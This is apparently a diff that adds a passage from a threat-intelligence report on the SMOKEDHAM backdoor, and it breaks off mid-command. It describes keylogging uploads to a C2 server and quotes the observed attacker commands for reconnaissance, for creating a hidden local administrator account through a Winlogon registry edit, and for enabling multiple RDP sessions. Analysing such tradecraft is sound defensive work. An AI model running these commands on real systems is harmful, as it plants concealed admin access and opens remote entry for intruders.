@@ -1,0 +1,13 @@
+
+In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes.
+The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests.
+SMOKEDHAM In Action SMOKEDHAM was observed executing commands on the target system using PowerShell.
+The following commands were used to collect information about the system and logged in users.
+net.exe user net.exe users whoami.exe whoami.exe /priv systeminfo.exe The following commands were used to create and add the DefaultUser account to the local Administrators group, and subsequently hide the account from the Windows logon screen.
+net.exe user DefaultUser REDACTED /ADD net.exe localgroup Administrators DefaultUser /ADD reg.exe
+ADD 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList' /v
+DefaultUser /t
+REG_DWORD /d 0 /f
+The following commands facilitated lateral movement by modifying Terminal Server registry key values to enable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA) registry key value to require a password for authentication.
+reg.exe ADD 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t
+REG_DWORD /d 0 /f reg.exe ADD 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fSingleSessionPerUser /t
